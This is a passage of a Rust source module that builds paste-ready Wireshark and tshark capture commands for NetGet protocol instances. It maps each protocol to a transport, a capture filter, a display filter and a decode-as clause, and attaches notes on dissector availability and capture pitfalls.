//! `[ view in wireshark ]` — a paste-ready capture command for one instance.
//!
//! NetGet does not write pcaps; what it can do is tell Wireshark exactly where
//! to look. Given what the dashboard already knows about an instance (its
//! protocol, the address it binds or dials, an interface for the raw-socket
//! protocols) this module derives:
//!
//! * the **interface** to listen on (loopback for local addresses, the
//!   platform's "everything" device otherwise),
//! * a **capture filter** (BPF, applied at capture time — cheap),
//! * a **display filter** (Wireshark syntax — names the dissector, so the
//!   packet list shows decoded `HTTP`/`DNS`/`MQTT` rows, not `TCP`),
//! * a `-d` **decode-as** clause, because most instances sit on a port
//!   Wireshark would not guess the protocol for (an HTTP server on 8080 is
//!   just TCP to it until told otherwise),
//! * and the `wireshark` / `tshark` command lines that put those together.
//!
//! Everything here is pure and platform-parameterised so it can be asserted in
//! tests; the only system knowledge is a table of which NetGet protocol rides
//! on which transport and what Wireshark calls its dissector. A protocol
//! missing from the table still gets a correct, if undecoded, capture.
//!
//! The form offers the same thing **before** the instance exists, so the
//! capture can be running when the first packet arrives — the whole point of
//! showing it at creation time.

use crate::utils::sanitize::has_controls;
use std::fmt::Write as _;

/// What the protocol rides on, which decides both filters.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Transport {
    Tcp,
    Udp,
    /// Served on both (DNS, SIP, syslog): filter on the port, either transport.
    TcpOrUdp,
    /// An IP-level or link-level protocol with no port. The payload is the
    /// BPF keyword/expression that selects it.
    Raw(&'static str),
    /// Not on an IP network at all — USB, Bluetooth, a pty. Wireshark can
    /// sometimes still see it, but not through a network interface.
    NotNetwork,
}

/// How Wireshark should treat one protocol.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Wire {
    pub transport: Transport,
    /// Dissector name for `-d <transport>.port==N,<name>`; `None` means no
    /// application-layer dissector applies (plain TCP/UDP) or the protocol has
    /// no port.
    pub decode_as: Option<&'static str>,
    /// Display-filter expression for the application layer, when it differs
    /// from `decode_as` (`nbss` decodes SMB, but you filter on `smb2`).
    pub display: Option<&'static str>,
    /// A sentence for the protocols Wireshark cannot reach via an interface.
    pub note: Option<&'static str>,
}

const fn tcp(decode_as: &'static str) -> Wire {
    Wire {
        transport: Transport::Tcp,
        decode_as: Some(decode_as),
        display: None,
        note: None,
    }
}

const fn udp(decode_as: &'static str) -> Wire {
    Wire {
        transport: Transport::Udp,
        decode_as: Some(decode_as),
        display: None,
        note: None,
    }
}

const fn either(decode_as: &'static str) -> Wire {
    Wire {
        transport: Transport::TcpOrUdp,
        decode_as: Some(decode_as),
        display: None,
        note: None,
    }
}

const fn raw(bpf: &'static str, display: &'static str) -> Wire {
    Wire {
        transport: Transport::Raw(bpf),
        decode_as: None,
        display: Some(display),
        note: None,
    }
}

const fn offline(note: &'static str) -> Wire {
    Wire {
        transport: Transport::NotNetwork,
        decode_as: None,
        display: None,
        note: Some(note),
    }
}

const fn with_display(wire: Wire, display: &'static str) -> Wire {
    Wire {
        display: Some(display),
        ..wire
    }
}

/// Attach a caveat to an otherwise-correct entry.
///
/// Distinct from [`offline`], which says "there is no capture command for this at all".
/// These protocols *do* have a working command; the note warns about a way the obvious
/// capture still shows you the wrong thing.
const fn with_note(wire: Wire, note: &'static str) -> Wire {
    Wire {
        note: Some(note),
        ..wire
    }
}

const PLAIN_TCP: Wire = Wire {
    transport: Transport::Tcp,
    decode_as: None,
    display: None,
    note: None,
};

const PLAIN_UDP: Wire = Wire {
    transport: Transport::Udp,
    decode_as: None,
    display: None,
    note: None,
};

const DEVP2P_NOTE: &str = "RLPx encrypts every devp2p frame (AES-256-CTR, keys from an ECIES \
    handshake) and Wireshark has no RLPx dissector, so the capture shows the two handshake \
    packets and frame sizes, never a message. NetGet's own log has every decoded message.";

const VXLAN_ENCAPSULATION_NOTE: &str = "This decodes VXLAN. With encapsulation geneve use \
    `-d udp.port==<port>,geneve` instead, and with gretap (GRE in UDP) `-d udp.port==<port>,gre`.";

const TFTP_TID_NOTE: &str = "A `udp port 69` filter captures only the initial RRQ/WRQ. TFTP \
    then moves the transfer to an ephemeral TID port, so every DATA and ACK packet is missed. \
    Capture the host instead (drop the port from the filter) and use the `tftp` display filter.";

const GTP_NOTE: &str = "GTP binds two ports and they are different protocols: GTP-C on \
2123 (signalling) and GTP-U on 2152 (user payload). Give each its own `-d udp.port==N,gtp` \
clause, or the port you omit stays undecoded.";

const M3UA_NOTE: &str = "M3UA runs over SCTP with payload protocol identifier 3, which \
Wireshark's m3ua dissector registers on, so the `sctp` capture filter needs no decode-as clause; \
SCCP, TCAP, GSM MAP and CAMEL are dissected beneath it by service indicator, SSN and application \
context. NetGet's non-standard `transport=tcp` lab transport carries the same messages on a TCP \
stream: capture `tcp port N` and add `-d tcp.port==N,m3ua` for that one.";

const NGAP_NOTE: &str = "NGAP runs over SCTP with payload protocol identifier 60, which \
Wireshark's ngap dissector registers on, so the `sctp` capture filter and the `ngap` display filter \
are all that is needed (add `-d sctp.port==N,ngap` only if a peer sends PPID 0). NetGet's \
`transport=tcp` lab framing is a NetGet-only 4-octet length prefix over TCP that no dissector \
knows, so a lab-transport capture shows plain TCP; read the PDUs in the hex pane.";

const CAN_NOTE: &str = "Wireshark dissects CAN from a SocketCAN capture on a bus interface \
(`can0`, `vcan0`) on Linux, where `can` is a valid display filter. There is no IP port to \
filter on. NetGet's UDP transport carries a raw `struct can_frame` with no encapsulation \
Wireshark recognises, and `-d udp.port==N,can` is rejected outright - so for the UDP lab \
transport there is nothing to decode with, and the bytes must be read by hand.";

const NFC_SERVER_NOTE: &str = "NetGet's NFC server is a plain TCP socket speaking vpcd - no \
PC/SC call is made and no reader is involved - so the whole exchange is capturable on \
loopback. Wireshark has no vpcd dissector, so the length-prefixed APDUs appear as raw bytes; \
read them in the hex pane.";

const L2_ETHER_ONLY_NOTE: &str = "This filter names an Ethernet address or EtherType, which \
BPF rejects on a loopback device (DLT_NULL on macOS) - the same trap as `isis` and `arp`. \
Capture on a real NIC, or on the feth pair. The UDP test transport is not a way round it: \
neither `eth_withoutfcs` nor these link-layer names is a valid `udp.port` decode-as target, so \
those frames cannot be dissected at all.";

const CARP_NOTE: &str = "If this server is running the `carp` variant, add `-d \
ip.proto==112,carp`. CARP shares IP protocol 112 with VRRP and Wireshark registers `carp` as \
the default for nothing, so without that clause a CARP packet is dissected as VRRP - and a \
healthy CARP host then reads as a VRRPv2 master resigning.";

const USBIP_NOTE: &str = "NetGet's USB servers are plain TCP listeners speaking USB/IP, so the \
whole session is capturable on the port NetGet chose. This is strictly better than usbmon: no \
kernel ever enumerates these devices, so usbmon cannot see them at all. The dissector handles \
OP_REQ_IMPORT and USBIP_CMD_SUBMIT framing and the class payloads (CCID, HID, MSC).";

const ARP_LOOPBACK_NOTE: &str = "`arp` is an Ethernet-only BPF keyword and is rejected on \
    loopback, which is DLT_NULL on macOS. Capture on a real interface; ARP is not carried on lo0 \
    at all, so there would be nothing to see there anyway. Same trap as isis.";

const QUIC_ALPN_NOTE: &str = "NetGet's raw QUIC protocol negotiates ALPN `netget-quic`. \
    Its bidirectional streams contain application bytes delimited by FIN. HTTP/3 uses \
    the separate `http3` protocol and ALPN `h3`.";

const USB_NOTE: &str = "USB is not network traffic. Wireshark can capture it from usbmon on \
                        Linux (tshark -D lists usbmonN) or the XHC20 device on macOS after \
                        `sudo ifconfig XHC20 up`; the USB/IP socket NetGet exposes is plain TCP \
                        and can be watched on that port instead.";
const BLE_NOTE: &str = "Bluetooth is not network traffic. On Linux use btmon or Wireshark's \
                        bluetooth-monitor interface; on macOS enable PacketLogger from the \
                        Bluetooth developer tools and open its .pklg in Wireshark.";
const LOCAL_NOTE: &str = "This protocol runs over a local descriptor (pty, pipe, socket file, \
                          stdio), which never crosses a network interface. Use `strace -e \
                          trace=read,write` / `dtruss` on the process, or `socat -v` in front \
                          of the socket, to watch it.";

/// NetGet protocol name (as `protocol_name()` reports it, any case) → wire.
///
/// A name not listed here is plain TCP: every protocol in the registry that
/// is not UDP, raw or off-network speaks TCP, so the default is right far
/// more often than it is wrong, and the worst case is an undecoded capture.
pub fn wire_for(protocol: &str) -> Wire {
    let name = protocol.trim().to_ascii_lowercase().replace('-', "_");
    match name.as_str() {
        // ---- transports --------------------------------------------------
        "tcp" | "reverse_shell" | "dc" | "zookeeper" | "svn" => PLAIN_TCP,
        "udp" | "statsd" | "dogstatsd" => PLAIN_UDP,
        // Steam server query has no dissector in this build (`tshark -G protocols` lists none);
        // it is UDP, so the TCP fallback would capture nothing.
        "minecraft" => with_note(PLAIN_TCP, "Wireshark has no Minecraft Java Edition dissector (its mcpe is Bedrock over RakNet): each packet is a VarInt length, a VarInt id and the body; a legacy ping starts FE and is answered FF."),
        "a2s" => with_note(PLAIN_UDP, "Wireshark has no A2S dissector: each datagram starts FF FF FF FF (FE FF FF FF for split answers), then T/U/V for a query and A/I/D/E for a challenge or answer."),
        "gelf" | "graylog" => Wire {
            transport: Transport::TcpOrUdp,
            decode_as: None,
            display: None,
            note: Some("GELF supports UDP and TCP on this port. For UDP add `-d udp.port==PORT,gelf`; the GELF dissector does not accept TCP decode-as. TCP messages are NUL-delimited JSON."),
        },
        "tls" | "dot" | "tor_relay" => tcp("tls"),
        "doq" => udp("quic"),
        // RFC 7011 version 10 over UDP. Decode-as and display syntax checked with tshark.
        "ipfix" => udp("cflow"),
        "sflow" => udp("sflow"),
        "netflow_v9" | "netflowv9" => udp("cflow"),
        "quic" => with_note(udp("quic"), QUIC_ALPN_NOTE),
        // The discovery family. All three are UDP and all three were falling through to the
        // PLAIN_TCP default, which is simply the wrong transport. Dissector names checked
        // against this machine's tshark: present in `-G protocols` and accepted by
        // `-d udp.port==N,<name>` (a bogus name is rejected there, so the check is real).
        // The DynamoDB *client* reports protocol_name() "DynamoDB" -> "dynamodb", which the
        // web arm above does not list (it has only the server's "dynamo"), so it fell through
        // to PLAIN_TCP and lost the HTTP dissector.
        "dynamodb" => tcp("http"),
        // Client-only protocol names. Both talk HTTP to a provider and may use TLS, so the
        // display filter admits either; without an arm they defaulted to plain TCP.
        "openidconnect" => with_display(tcp("http"), "http || tls"),
        "saml" => with_display(tcp("http"), "http || tls"),
        // finger and gopher have real dissectors (verified present in `tshark -G protocols`
        // on this machine). `ident` deliberately has NO entry: this Wireshark build ships no
        // ident dissector, so naming one would be a lie and plain TCP is the honest answer.
        "finger" => tcp("finger"),
        "gopher" => tcp("gopher"),
        // DICT (RFC 2229, TCP 2628) has no dissector in this Wireshark build: `tshark -G
        // protocols` lists none and `-d tcp.port==2628,dict` is rejected as an unknown
        // protocol. Plain TCP is the honest answer; "Follow TCP Stream" reads it fine.
        "dict" => PLAIN_TCP,
        "tacacs" | "tacacs+" | "tacacs_plus" | "tacacsplus" => with_note(
            tcp("tacplus"),
            "This feature speaks legacy RFC 8907 TACACS+. Its obfuscated body requires the configured shared secret in Wireshark to decode; it does not speak the TLS profile.",
        ),
        "diameter" => with_note(
            tcp("diameter"),
            "This binding uses clear TCP for the selected stateless NASREQ application. TLS, SCTP and vendor applications are outside its implemented surface.",
        ),
        // Neo4j's Bolt (TCP 7687) has no dissector in this Wireshark build (4.6.8): `tshark -G
        // protocols` lists nothing matching bolt, neo4j or packstream. Plain TCP; the chunked
        // PackStream is binary, so "Follow TCP Stream" in hex is what a capture offers.
        "bolt" => PLAIN_TCP,
        // Beanstalkd (TCP 11300) has no dissector in this Wireshark build: `tshark -G protocols`
        // lists none. Plain TCP; its text protocol reads fine in "Follow TCP Stream".
        "beanstalkd" => PLAIN_TCP,
        // Zabbix trapper (TCP 10051). `zabbix` is Wireshark's own dissector for the ZBXD
        // framing (`tshark -G protocols` lists it; checked with `-d tcp.port==10051,zabbix`).
        "zabbix" => tcp("zabbix"),
        // Gearman (TCP 4730). `gearman` is Wireshark's own dissector for the binary packet
        // protocol (`tshark -G protocols` lists it; checked with `-d tcp.port==4730,gearman`).
        "gearman" => tcp("gearman"),
        // NSQ (TCP 4150) has no dissector in this Wireshark build: `tshark -G protocols` lists
        // nothing matching nsq. Plain TCP; its commands are text lines and "Follow TCP Stream"
        // reads them, with the size-prefixed frames in between.
        "nsq" => PLAIN_TCP,
        // Gemini (TCP 1965) runs entirely inside TLS and this Wireshark build has no gemini
        // dissector (`tshark -G protocols` lists none), so the TLS layer is the most any
        // capture can show without the session keys.
        "gemini" => tcp("tls"),
        // EPP is RFC 5734 length-prefixed XML inside TLS; this build has no EPP dissector.
        "epp" => with_note(tcp("tls"), "EPP frames are a 4-byte length and an XML document inside TLS. Without the TLS session keys only the handshake shows; with tls: false follow the TCP stream to read the XML."),
        // Nostr relay: NIP-01 JSON in WebSocket text frames after an HTTP/1.1 upgrade. There is
        // no nostr dissector in this Wireshark build (`tshark -G protocols` lists none); decoded
        // as `http`, the 101 hands the stream to Wireshark's own `websocket` dissector, whose
        // payload it reads as JSON — checked with `-d tcp.port==N,http -Y websocket`.
        "nostr" => with_display(tcp("http"), "websocket"),
        // OCPP-J is JSON text in WebSocket frames; no OCPP dissector exists in this build.
        "ocpp" => with_note(with_display(tcp("http"), "websocket"), "OCPP-J messages are JSON arrays in WebSocket text frames; the websocket filter shows each CALL, CALLRESULT and CALLERROR."),
        // A2A is JSON-RPC over plain HTTP (SSE for streams); no A2A dissector exists.
        "stratum v2" | "stratum_v2" | "stratumv2" => with_note(PLAIN_TCP, "Wireshark has no Stratum V2 dissector, and after the handshake there is nothing to dissect: the first 64 bytes from the device and 234 from the pool are the Noise NX handshake (ElligatorSwift keys, then the encrypted static key and certificate), and every frame after is a 22-byte encrypted header followed by ChaCha20-Poly1305 chunks. Message timing and sizes are all a capture shows."),
        "onvif" => with_note(tcp("http"), "ONVIF is SOAP 1.2 in HTTP POST bodies to /onvif/device_service and /onvif/media_service; the http filter shows each envelope, with its WS-Security UsernameToken in the header."),
        "a2a" => with_note(tcp("http"), "A2A 1.0 is JSON-RPC 2.0 in HTTP POST bodies to /, with streamed answers as text/event-stream; the agent card is GET /.well-known/agent-card.json."),
        // GraphQL is JSON over plain HTTP; no GraphQL dissector exists in this build.
        "graphql" => with_note(tcp("http"), "GraphQL requests are JSON POST bodies (or GET query strings) to the endpoint path; answers are application/graphql-response+json or application/json. Subscriptions are graphql-transport-ws JSON in WebSocket text frames on the same path: add the websocket display filter."),
        "ssdp" => udp("ssdp"),
        "llmnr" => udp("llmnr"),
        "netbios_ns" => udp("nbns"),
        // Both HTTP/3 roles use QUIC. Application fields require TLS secrets.
        "http3" | "http/3" | "h3" => with_note(
            with_display(udp("quic"), "http3 || quic"),
            "HTTP/3 uses ALPN h3 over UDP. Wireshark needs TLS session secrets to inspect HTTP/3 headers and data; otherwise the capture shows QUIC.",
        ),
        // WebTransport sessions are HTTP/3 extended CONNECT; streams and datagrams ride QUIC.
        "webtransport" => with_note(
            with_display(udp("quic"), "http3 || quic"),
            "WebTransport is an HTTP/3 extended CONNECT (ALPN h3) whose streams and datagrams are QUIC payload. Wireshark needs the TLS session secrets to show the CONNECT and the session's data; otherwise the capture shows QUIC.",
        ),
        "fluentforward" | "fluent_forward" | "fluentd" => with_note(
            PLAIN_TCP,
            "Fluent Forward uses MessagePack over TCP. This Wireshark build has no Forward dissector; inspect the stream bytes and correlated ACKs.",
        ),
        // ---- web ---------------------------------------------------------
        "http" | "websocket" | "proxy" | "webdav" | "jsonrpc" | "xmlrpc" | "openapi" | "openai"
        | "ollama" | "mcp" | "oauth2" | "openid" | "saml_idp" | "saml_sp" | "s3" | "sqs"
        | "dynamo" | "elasticsearch" | "couchdb" | "kubernetes" | "oci_registry" | "npm"
        | "pypi" | "maven" | "rss" | "hls" | "yarn" | "spark" | "snowflake" | "mercurial"
        | "webrtc_signaling" | "torrent_tracker" | "prometheus" | "prometheus_remote_write" | "prometheusremotewrite"
        | "remote_write" | "prometheus_write" | "vault" | "influxdb" | "loki" => tcp("http"),
        "docker" => with_note(
            tcp("http"),
            "This captures Docker HTTP TCP connections. A native Unix socket has no IP packets to capture.",
        ),
        // The receiver admits both HTTP/1.1 and gRPC/HTTP2 on the same port. Do not
        // force one dissector before the instance's selected transport is known.
        "otlp" => Wire {
            transport: Transport::Tcp,
            decode_as: None,
            display: Some("http || http2 || grpc"),
            note: Some("Choose HTTP for OTLP/HTTP or HTTP/2 for OTLP/gRPC in Wireshark Decode As. TLS exports require TLS session keys."),
        },
        "doh" => tcp("tls"),
        "http2" => tcp("http2"),
        "grpc" | "etcd" => with_display(tcp("http2"), "grpc || http2"),
        "gnmi" => with_note(
            with_display(tcp("http2"), "grpc || http2"),
            "gNMI uses native HTTP/2 and the OpenConfig gNMI protobuf schema. This recipe decodes the cleartext carrier; explicitly enabled TLS requires session keys and TLS Decode As in Wireshark.",
        ),
        "connect_rpc" | "connectrpc" | "connect rpc" => with_note(
            tcp("http"),
            "This binding uses binary protobuf ConnectRPC over cleartext HTTP/1.1. The HTTP carrier is decoded; protobuf bodies require the matching schema and streamed replies end with a Connect EndStream envelope.",
        ),
        "grpc_web" | "grpcweb" | "grpc web" => with_note(
            tcp("http"),
            "This binding uses binary gRPC-Web over cleartext HTTP/1.1. The HTTP carrier is decoded; protobuf body interpretation requires the matching schema.",
        ),
        // ---- mail / text -------------------------------------------------
        "smtp" => tcp("smtp"),
        // LMTP (RFC 2033) has no dissector of its own; it shares SMTP's command and reply syntax,
        // so the SMTP dissector reads it, apart from naming LHLO as an unknown command.
        "lmtp" => with_note(tcp("smtp"), "Wireshark has no LMTP dissector; decoded as SMTP, which reads the shared command and reply syntax. Expect one reply per accepted recipient after the final dot."),
        // Wireshark's `lpd` dissector reads RFC 1179 command codes and the receive-job subcommands.
        "lpd" => tcp("lpd"),
        // Wireshark's `9p` dissector decodes 9P2000 (and .u/.L) on TCP; checked with `tshark -d`.
        "9p" => tcp("9p"),
        // Wireshark's `msgpack` dissector decodes the values; the RPC envelope is the array
        // [type, msgid, method, params] it shows.
        "msgpack-rpc" => tcp("msgpack"),
        "clickhouse" => with_note(PLAIN_TCP, "Wireshark has no ClickHouse native-protocol dissector: packets start with a VarUInt type (client 0 hello, 1 query, 2 data, 4 ping; server 0 hello, 1 data, 2 exception, 5 end of stream) followed by length-prefixed strings and column blocks."),
        // Wireshark's `smpp` dissector decodes SMPP 3.4 PDUs, receipts and TLVs.
        "smpp" => tcp("smpp"),
        "zeromq" => with_note(PLAIN_TCP, "Wireshark ships no ZMTP dissector (the zeromq project publishes a Lua one): after a 64-byte greeting starting FF and ending the signature 7F, each frame is a flags byte (01 more, 02 long, 04 command) and a 1- or 8-byte size."),
        // The classic inetd services: Wireshark ships `echo`, `discard`, `daytime`, `chargen`
        // and `time` dissectors (checked with `tshark -G protocols`); qotd has none.
        "echo" => tcp("echo"),
        "discard" => tcp("discard"),
        "daytime" => tcp("daytime"),
        "chargen" => tcp("chargen"),
        "time" => tcp("time"),
        "pop3" => tcp("pop"),
        "imap" => tcp("imap"),
        "nntp" => tcp("nntp"),
        "irc" => tcp("irc"),
        "xmpp" => tcp("xmpp"),
        "telnet" => tcp("telnet"),
        "ssh" => tcp("ssh"),
        // No NETCONF dissector exists in this Wireshark build (4.6.8: `tshark -G protocols`
        // lists none), and NETCONF over SSH is inside the encrypted channel anyway, so the
        // honest recipe decodes the SSH transport on the NETCONF port.
        // `rpkirtr` is in the tcp.port decode-as table (tshark -G decodes: tcp.port 323).
        "rpki_rtr" | "rpki-rtr" | "rpki" => tcp("rpkirtr"),
        // RDAP is JSON over HTTP; Wireshark has no RDAP dissector, the HTTP one shows it all.
        // `hl7` decodes MLLP-framed HL7 v2 on tcp.port (tshark -G decodes: tcp.port 2575).
        "hl7" | "mllp" => tcp("hl7"),
        // `icap` is in the tcp.port decode-as table (tshark -G decodes: tcp.port 1344).
        "icap" => tcp("icap"),
        "fastcgi" => tcp("fcgi"),
        // `dicom` is in the tcp.port decode-as table (tshark -G decodes: tcp.port 104).
        "dicom" => tcp("dicom"),
        // CalDAV and CardDAV are WebDAV verbs (PROPFIND, REPORT, MKCALENDAR) over HTTP.
        // ACME is JWS-signed JSON over HTTP(S); there is no ACME dissector.
        "acme" => with_note(tcp("http"), "ACME is application/jose+json over HTTP: JWS-signed POSTs to the directory's URLs, application/problem+json errors and PEM certificate chains; with tls_cert_file the listener is HTTPS and Wireshark shows only TLS without the key."),
        "caldav" => with_note(tcp("http"), "CalDAV is WebDAV over HTTP: PROPFIND, REPORT and MKCALENDAR with XML bodies, iCalendar in GET and PUT; production servers use HTTPS."),
        "carddav" => with_note(tcp("http"), "CardDAV is WebDAV over HTTP: PROPFIND, REPORT and extended MKCOL with XML bodies, vCards in GET and PUT; production servers use HTTPS."),
        // Socket.IO is Engine.IO text over HTTP long-polling or WebSocket; no dedicated dissector.
        "socketio" => with_note(with_display(tcp("http"), "http || websocket"), "Engine.IO packets are text: long-polling bodies split on U+001E, or one packet per WebSocket text frame (4 = message; 42 = a Socket.IO event)."),
        // SCIM is JSON (application/scim+json) over HTTP; there is no SCIM dissector.
        "scim" => with_note(tcp("http"), "SCIM is application/scim+json over HTTP under the service's base path (often /scim/v2); production services use HTTPS."),
        // Redfish is JSON over HTTP(S); there is no Redfish dissector.
        "redfish" => with_note(tcp("http"), "Redfish is JSON over HTTP under /redfish/v1; real BMCs use HTTPS, so capture shows TLS unless the service runs plain HTTP as NetGet's does."),
        "rdap" => with_note(tcp("http"), "RDAP is JSON over HTTP (application/rdap+json); the HTTP dissector shows each query and answer. Production RDAP is HTTPS."),
        "netconf" => with_note(
            tcp("ssh"),
            "NETCONF runs inside an encrypted SSH channel (RFC 6242). Wireshark shows the SSH handshake and encrypted packets; the XML is not visible without the session keys.",
        ),
        "ftp" => tcp("ftp"),
        "whois" => tcp("whois"),
        "socks5" => tcp("socks"),
        // NetGet's git server implements Smart **HTTP** only - the payload starts
        // "GET /...info/refs?service=git-upload-pack HTTP/1.1". Wireshark's `git`
        // dissector decodes pkt-line directly over TCP, i.e. git:// on 9418, and will not
        // decode this. The trap is that our own examples use port 9418, which makes the
        // wrong entry look right.
        "git" => tcp("http"),
        // ---- databases / brokers -----------------------------------------
        "mysql" => tcp("mysql"),
        "postgresql" => tcp("pgsql"),
        "mssql" => tcp("tds"),
        "mongodb" => tcp("mongo"),
        "cassandra" => tcp("cql"),
        // DRDA registers only a heuristic dissector — it is not in the
        // `tcp.port` decode-as table, so name it in the display filter alone.
        "db2" => with_display(PLAIN_TCP, "drda"),
        // `srt` is a heuristic UDP dissector (srt_udp, on by default).
        "srt" => with_display(PLAIN_UDP, "srt"),
        // Wireshark's RTMP dissector is `rtmpt`, in the tcp.port decode-as table (1935).
        "rtmp" => tcp("rtmpt"),
        // WAMP is JSON in WebSocket text frames (subprotocol wamp.2.json); no WAMP dissector.
        "wamp" => with_note(with_display(tcp("http"), "websocket"), "WAMP messages are JSON arrays in WebSocket text frames: [1, realm, details] is HELLO, 48 CALL, 50 RESULT, 16 PUBLISH, 36 EVENT."),
        // `fix` is a heuristic TCP dissector (fix_tcp, on by default), not in the decode-as table.
        "fix" => with_display(PLAIN_TCP, "fix"),
        // Framed or unframed, binary or compact: the `thrift` dissector reads all four.
        "thrift" => tcp("thrift"),
        "bmp" => tcp("bmp"),
        "redis" => tcp("resp"),
        "memcached" => tcp("memcache"),
        "ldap" => tcp("ldap"),
        "kafka" => tcp("kafka"),
        "amqp" => tcp("amqp"),
        // Wireshark's `amqp` dissector reads 1.0 as well as 0-9-1 from the protocol header.
        "amqp1" => tcp("amqp"),
        "mqtt" => tcp("mqtt"),
        "mqtt_sn" => udp("mqttsn"),
        "nbd" => tcp("nbd"),
        // RESTCONF is HTTP carrying YANG JSON.
        "restconf" => tcp("http"),
        // JMAP is JSON over HTTPS (or HTTP with tls: false); TLS hides it without session keys.
        "jmap" => with_note(with_display(tcp("http"), "http || tls"), "JMAP requests are JSON POSTs to the session's apiUrl. Over HTTPS (the default) Wireshark needs the TLS session keys to show them; with tls: false the http dissector shows the JSON."),
        // LwM2M is CoAP: the coap dissector shows the operations (lwm2mtlv decodes TLV bodies).
        "lwm2m" => udp("coap"),
        // Wireshark ships no Zenoh dissector (the project offers a Lua plugin).
        "zenoh" => with_note(PLAIN_TCP, "Wireshark has no built-in Zenoh dissector; the zenoh project publishes a Lua plugin (zenoh-dissector) that decodes this TCP stream."),
        // Wireshark has no ManageSieve dissector; the protocol is CRLF text, readable as TCP.
        "managesieve" => with_note(PLAIN_TCP, "ManageSieve is CRLF-delimited text: follow the TCP stream. Commands are atoms with quoted strings or {n+} literals; answers end in OK, NO or BYE."),
        // ---- remote desktop / files / industrial -------------------------
        "vnc" => tcp("vnc"),
        "rdp" => with_display(tcp("tpkt"), "rdp"),
        "spice" => tcp("spice"),
        // SMB2 over TCP rides in the Direct TCP transport header, which Wireshark decodes as
        // `nbss`; `smb2` has no `tcp.port` entry of its own, so it cannot be the decode-as.
        "smb" => with_display(tcp("nbss"), "smb2 || smb"),
        "nfs" => with_display(tcp("rpc"), "nfs"),
        // The portmapper is ONC RPC on TCP and UDP; rpc decodes it and portmap names its calls.
        "sunrpc" => with_display(either("rpc"), "portmap"),
        "modbus" => tcp("mbtcp"),
        // IPP is an HTTP payload; Wireshark reaches it through the http
        // dissector, which picks ipp by media type.
        "ipp" => with_display(tcp("http"), "ipp || http"),
        "bgp" => tcp("bgp"),
        "bitcoin" => tcp("bitcoin"),
        // RLPx encrypts every frame after its two handshake packets and Wireshark has no RLPx
        // dissector, so there is nothing to decode as: the capture shows packet sizes only.
        "devp2p" => with_note(PLAIN_TCP, DEVP2P_NOTE),
        "torrent_peer" => tcp("bittorrent"),
        // ---- UDP ---------------------------------------------------------
        "dns" => either("dns"),
        "mdns" => udp("mdns"),
        "ntp" => udp("ntp"),
        "dhcp" | "bootp" => udp("dhcp"),
        "dhcpv6" => udp("dhcpv6"),
        // The WoL dissector is heuristic: it finds a magic packet on any UDP port and cannot
        // be named in a udp.port decode-as, so only the display filter selects it.
        "wol" => with_display(PLAIN_UDP, "wol"),
        // `udp port 69` captures only the RRQ/WRQ: TFTP then moves to an ephemeral TID
        // port for DATA/ACK, so a port-69 filter shows the request and none of the transfer.
        "tftp" => with_note(udp("tftp"), TFTP_TID_NOTE),
        "snmp" => udp("snmp"),
        "syslog" => either("syslog"),
        "radius" => udp("radius"),
        "kerberos" => either("kerberos"),
        "stun" => udp("stun"),
        "turn" => with_display(udp("stun"), "stun || turnchannel"),
        "coap" => udp("coap"),
        "rip" => udp("rip"),
        // The vxlan protocol also speaks Geneve and GRE-in-UDP, chosen by its `encapsulation`
        // startup parameter, which this table cannot see; the note names their decode-as.
        "vxlan" => with_note(udp("vxlan"), VXLAN_ENCAPSULATION_NOTE),
        "pfcp" => udp("pfcp"),
        "geneve" => udp("geneve"),
        // GRE-in-UDP (RFC 8086): tshark 4.6.8 registers `gre` on udp.port 4754 and accepts it
        // in `-d udp.port==N,gre`; protocol type 0x6558 hands the inner frame to `eth`.
        "gre" | "gretap" => udp("gre"),
        "bfd" => udp("bfd"),
        "sip" => either("sip"),
        // H.225.0 call signalling is Q.931 inside TPKT, which Wireshark finds on any TCP port
        // by itself and hands on to H.225.0 and tunnelled H.245. No decode-as: `tpkt` names
        // the TPKT heuristic meant for RDP, and with it nothing is dissected as H.225.0.
        "h323" => with_display(PLAIN_TCP, "q931 || h225 || h245"),
        // RAS: one PER-encoded RasMessage per datagram.
        "h323_gatekeeper" => udp("h225"),
        "rtp" => udp("rtp"),
        "rtsp" => tcp("rtsp"),
        "wireguard" => udp("wg"),
        "openvpn" => udp("openvpn"),
        "ipsec" => udp("isakmp"),
        "torrent_dht" => with_display(udp("bt-dht"), "bt-dht"),
        "webrtc" => with_display(udp("stun"), "stun || dtls || rtp"),
        // The telecom/industrial family, all three of which were falling through to the
        // PLAIN_TCP default. For gtp and can that default is the wrong *transport*, not
        // merely a missing dissector. Checked against this machine's tshark 4.6.8, which
        // rejects an unknown name in `-d` (verified with a bogus one), so these are
        // measurements: `udp.port==N,gtp` is accepted, `tcp.port==N,m3ua` is accepted (the m3ua
        // entry now names SCTP, its real transport; the note keeps the TCP lab form),
        // and `udp.port==N,can` is *rejected* - hence can gets the off-network treatment
        // rather than a dissector it does not have.
        "gtp" => with_note(with_display(udp("gtp"), "gtp || gtpv2"), GTP_NOTE),
        "m3ua" => with_note(raw("sctp", "m3ua || sccp || tcap || gsm_map || camel"), M3UA_NOTE),
        "ngap" => with_note(raw("sctp", "ngap"), NGAP_NOTE),
        "can" => offline(CAN_NOTE),
        // ---- raw / link layer --------------------------------------------
        "icmp" => raw("icmp", "icmp"),
        "igmp" => raw("igmp", "igmp"),
        "ospf" => raw("ip proto 89", "ospf"),
        // Same trap as isis: `arp` is an Ethernet-only BPF keyword and is rejected on
        // loopback (DLT_NULL on macOS). Capture on a real interface.
        "arp" => with_note(raw("arp", "arp"), ARP_LOOPBACK_NOTE),
        // `isis` is an Ethernet-only BPF keyword and is rejected outright on a
        // loopback device, so let the display filter do the selecting.
        "isis" => raw("", "isis"),
        // The redundancy and discovery family. None of the five needs a `-d` clause: tshark's
        // own defaults already map ip.proto 112, llc.dsap 0x42, ethertype 0x88cc,
        // llc.cisco_pid 0x2000 and udp.port 1985 to these dissectors, so `raw(bpf, display)`
        // is the right shape even for HSRP, which rides UDP.
        //
        // Only the first two can be captured on loopback; the three that name an Ethernet
        // address or EtherType are rejected there.
        "vrrp" => with_note(raw("ip proto 112", "vrrp"), CARP_NOTE),
        "hsrp" => raw("udp port 1985", "hsrp"),
        "stp" => with_note(
            raw("ether dst 01:80:c2:00:00:00", "stp"),
            L2_ETHER_ONLY_NOTE,
        ),
        "lldp" => with_note(raw("ether proto 0x88cc", "lldp"), L2_ETHER_ONLY_NOTE),
